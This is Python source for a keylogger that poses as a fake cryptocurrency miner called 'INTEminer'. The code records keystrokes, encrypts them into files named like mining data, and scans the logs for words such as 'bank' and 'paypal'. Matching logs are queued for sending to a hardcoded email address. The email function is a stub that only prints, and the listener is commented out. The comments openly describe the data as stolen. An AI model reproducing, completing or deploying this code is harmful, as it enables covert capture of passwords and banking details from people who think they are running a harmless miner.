import os.path
import time
import random

from multiprocessing import Process
from cryptography.fernet import Fernet
from os import path
from pynput.keyboard import Key, Listener

keys = []
keystrokes_count = 0
saves_count = 0
KEYSTROKES_BUFFER_SIZE = 20  # How many keystrokes before saving
SAVES_BUFFER_SIZE = 2  # How many saves before sending
FILE_PATH = "Data/"  # File path to save stolen data
TARGET_EMAIL = "intelogger@gmail.com" # Sender and receiver of the data


class Encryption():
    encryptKey = "bfSmGi_FREbBA4tiQhD23rxeArgAysjxpdCg2mMEjmk="  # Generated using Fernet.generate_key()

    @staticmethod
    def encrypt(text):
        """
        This function encrypts data and returns the encryption.
        :param text: The data to be encrypted.
        :return: The encrypted text.
        """
        return Fernet(Encryption.encryptKey).encrypt(text.encode())

    @staticmethod
    def decrypt(text):
        """
        This function decrypts data and returns it as plain text.
        :param text: The text to decrypt.
        :return: The decrypted text.
        """
        return Fernet(Encryption.encryptKey).decrypt(text).decode()

    @staticmethod
    def bytes_from_file(filename, chunksize=8192):
        with open(filename, "rb") as f:
            while True:
                chunk = f.read(chunksize)
                if chunk:
                    for b in chunk:
                        yield chr(b)
                else:
                    break


def press(key):
    """
    Activated by the listener every key press.
    Checks counters and sends the data to the logging function.
    :param key: The key pressed given from pynput module.
    """
    if str(key) == "Key.esc": # Checks for program exit
        return False
    global keys, keystrokes_count, saves_count
    keys.append(key)  # append every pressed key.
    keystrokes_count += 1  # keep track of how many keys.
    if keystrokes_count >= KEYSTROKES_BUFFER_SIZE:
        writer(keys)
        keystrokes_count = 0
        keys = []
        saves_count += 1
    if saves_count >= SAVES_BUFFER_SIZE:
        saves_count = 0
        results()


def writer(log):
    """
    Saves the log in a dat file.
    :param log: An array of pressed keys.
    """
    with open(FILE_PATH + "INTEcoin.dat", "ab") as file:
        toWrite = ""
        for i, key in enumerate(log): # Removes repeated spaces and enters
            if i > 0:
                if str(key) == "Key.space" and str(log[i - 1]) == "Key.space":
                    continue
                if str(key) == "Key.enter" and str(log[i - 1]) == "Key.enter":
                    continue
            key = parse(key) # Converts the key to a readable character
            toWrite += key
        file.write(Encryption.encrypt(toWrite))
        file.write(b"@")  # Putting a separator for the encryption diod see Fernet using this as the cypher text
        file.close()


def parse(key):
    """
    Takes a string of a key pressed and makes it human readable.
    :param key: A string to parse into readable format.
    :return: The key as readable as possible.
    """
    key = str(key)
    if key == "'":  # Handling the ' sign
        return key
    key = key.replace("'", "")  # Delete ' ' from output
    if key == "Key.enter" or key == "Key.space":
        return "\n"
    if "Key" in key:
        return key + " " # If it has a "Key" parameter before add a space so it's more readable
    return key


def results():
    """
    Steal logic function.
    """
    importantWords = ["bank", "hmo", "facebook", "mail", "paypal"]
    toSend = False
    message = ""
    accumulatedLog = []

    for byt in Encryption.bytes_from_file(FILE_PATH + "INTEcoin.dat"): # Read stolen data file as chunks and save them in a list
        if byt == "@":
            accumulatedLog.append(message)
            message = ""
            continue
        message += byt

    filename= FILE_PATH + "INTEcoin" + str(random.randint(1,10000)) + ".dat" # Save encrypted data as "INTEcoins"

    message = ""  # Reusing the parameter
    with open(filename, "wb") as file: # Saving the data in the new
        for mess in accumulatedLog:
            message += Encryption.decrypt(mess.encode()) # Decrypt the data
            file.write(mess.encode()) # Write the data on a random file for the "miner"
    for word in importantWords: # Checking if any sensitive data was inputted.
        if word in message:
            toSend = True
            break
    if toSend:
        send(accumulatedLog)  # Send the encrypted data
    os.remove(FILE_PATH + "INTEcoin.dat") # Delete file to avoid sending the same data again


def send(data):
    """
    Sends the data via email.
    :param data: The data to send.
    :param email: The email used to send. The email is the sender and the receiver.
    """
    global TARGET_EMAIL
    # Elad
    # Send data to mail saved in parameter: TARGET_EMAIL
    # SMTP
    print(data)


#with Listener(on_press=press) as listener: # Keypress listener
 #   listener.join()


def miner(): # Fake miner
    print("Welcome to INTEminer for INTEcoins!")
    print("Mining", end = "")
    INTEcoins=0
    while True:
        print(".", end = "")
        randomNumber=random.randint(1, 100)
        time.sleep(randomNumber/20) # Sleep for a short random time
        if random.randint(1, 10) == 5:
            INTEcoins += randomNumber
            print("\nMined {} INTEcoins! You currently have {} coins!".format(randomNumber, INTEcoins))
            print("Mining", end = "")

"""
if __name__ == '__main__':
    kl = Process(target = miner)
    kl.start()
"""
miner()
